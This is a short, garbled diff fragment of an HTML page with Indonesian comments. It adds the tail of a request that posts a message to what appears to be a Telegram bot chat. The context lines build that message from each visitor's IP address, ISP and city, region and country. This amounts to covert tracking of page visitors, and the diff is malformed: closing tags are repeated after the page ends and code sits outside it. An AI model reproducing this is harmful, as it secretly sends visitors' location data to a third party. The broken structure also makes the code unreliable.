@@ -79,6 +79,13 @@
 </script>
 </body>
 </html>
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+        });
+    }
+</script>
+</body>
+</html>
         pesan += `• IP: <code>${dataIP.ip}</code>\n`;
         pesan += `• ISP: ${dataIP.org || 'Tidak Terdeteksi'}\n`;
         pesan += `• Lokasi: ${dataIP.city}, ${dataIP.region}, ${dataIP.country_name}\n`;
